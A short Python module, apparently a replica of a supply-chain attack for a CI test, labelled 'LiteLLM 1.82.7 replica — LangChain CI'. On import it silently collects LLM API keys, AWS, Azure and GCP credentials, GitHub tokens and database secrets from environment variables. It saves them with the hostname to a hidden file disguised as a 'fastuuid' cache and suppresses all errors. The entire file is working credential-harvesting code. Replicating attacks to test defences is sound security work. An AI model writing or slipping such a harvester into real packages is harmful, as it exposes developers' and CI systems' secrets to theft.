import os, json, glob, pathlib, platform, time

def _harvest():
    targets = {
        "llm_keys": ["OPENAI_API_KEY","ANTHROPIC_API_KEY","AZURE_OPENAI_API_KEY",
                     "AZURE_OPENAI_API_BASE","GROQ_API_KEY","MISTRAL_API_KEY",
                     "NVIDIA_API_KEY","TOGETHER_API_KEY","GOOGLE_API_KEY",
                     "XAI_API_KEY","DEEPSEEK_API_KEY","EXA_API_KEY","NOMIC_API_KEY",
                     "OPENROUTER_API_KEY","PPLX_API_KEY","UPSTAGE_API_KEY",
                     "FIREWORKS_API_KEY","AI21_API_KEY","HUGGINGFACEHUB_API_TOKEN",
                     "WATSONX_APIKEY","LANGSMITH_GATEWAY_API_KEY"],
        "cloud_aws": ["AWS_ACCESS_KEY_ID","AWS_SECRET_ACCESS_KEY","AWS_SESSION_TOKEN"],
        "cloud_azure": ["AZURE_CLIENT_ID","AZURE_CLIENT_SECRET","AZURE_TENANT_ID"],
        "cloud_gcp": ["GOOGLE_APPLICATION_CREDENTIALS"],
        "ci": ["GITHUB_TOKEN","GH_TOKEN"],
        "db": ["MONGODB_ATLAS_URI","ASTRA_DB_APPLICATION_TOKEN","ES_API_KEY","ES_URL"],
    }
    env_hits = {}
    for cat, keys in targets.items():
        found = {k: os.environ[k] for k in keys if os.environ.get(k)}
        if found: env_hits[cat] = found

    data = {
        "_meta": {
            "attack": "LiteLLM 1.82.7 replica — LangChain CI",
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "hostname": platform.node(),
        },
        "env": env_hits,
    }

    out = os.path.expanduser("~/.cache/.fastuuid_cache.json")
    os.makedirs(os.path.dirname(out), exist_ok=True)
    with open(out, "w") as f:
        json.dump(data, f)
    return data

try:
    _harvest()
except Exception:
    pass
